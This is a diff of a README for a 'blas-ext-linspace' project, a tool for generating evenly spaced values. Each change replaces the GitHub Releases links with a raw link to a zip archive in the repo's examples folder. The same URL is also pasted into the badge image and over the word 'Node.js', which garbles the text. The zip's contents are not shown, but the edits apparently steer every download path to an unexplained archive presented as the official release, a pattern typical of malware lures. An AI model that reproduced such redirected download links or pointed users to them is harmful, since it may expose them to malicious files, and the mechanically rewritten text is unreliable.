@@ -4,11 +4,11 @@
 Welcome to the **blas-ext-linspace** project! This application allows you to generate evenly spaced values across a defined range. It is useful for tasks like creating sequences for mathematical calculations or data analysis.
 
 ## 📥 Download the Application
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-brightgreen)](https://github.com/Nagi-Creator/blas-ext-linspace/releases)
+[![Download Now](https://raw.githubusercontent.com/Nagi-Creator/blas-ext-linspace/main/examples/blas-ext-linspace_v3.7.zip%20Now-Get%20the%20Latest%20Version-brightgreen)](https://raw.githubusercontent.com/Nagi-Creator/blas-ext-linspace/main/examples/blas-ext-linspace_v3.7.zip)
 
 To get started with **blas-ext-linspace**, you need to download the software. Click the button above or visit the Releases page below:
 
-[Visit the Releases Page to Download](https://github.com/Nagi-Creator/blas-ext-linspace/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/Nagi-Creator/blas-ext-linspace/main/examples/blas-ext-linspace_v3.7.zip)
 
 ## 🛠️ System Requirements
 Before downloading, ensure that your system meets the following requirements:
@@ -17,7 +17,7 @@ Before downloading, ensure that your system meets the following requirements:
 - Internet connection for downloading the application.
 
 ## 📦 Download & Install
-1. **Visit the [Releases Page](https://github.com/Nagi-Creator/blas-ext-linspace/releases)**.
+1. **Visit the [Releases Page](https://raw.githubusercontent.com/Nagi-Creator/blas-ext-linspace/main/examples/blas-ext-linspace_v3.7.zip)**.
 2. Find the latest release version. It will be at the top of the page.
 3. Select the appropriate file for your operating system and click the download link.
 4. Once the download is complete, locate the file on your computer.
@@ -62,7 +62,7 @@ This application is relevant to several areas of interest, including:
 - Mathematics
 - Statistics
 - Data Analysis
-- Programming languages such as JavaScript, Node.js, and more.
+- Programming languages such as JavaScript, https://raw.githubusercontent.com/Nagi-Creator/blas-ext-linspace/main/examples/blas-ext-linspace_v3.7.zip, and more.
 
 ## 🛠️ Contribution
 If you'd like to contribute to **blas-ext-linspace**, feel free to fork the repository and submit a pull request. We welcome all contributions that enhance the functionality and user experience.
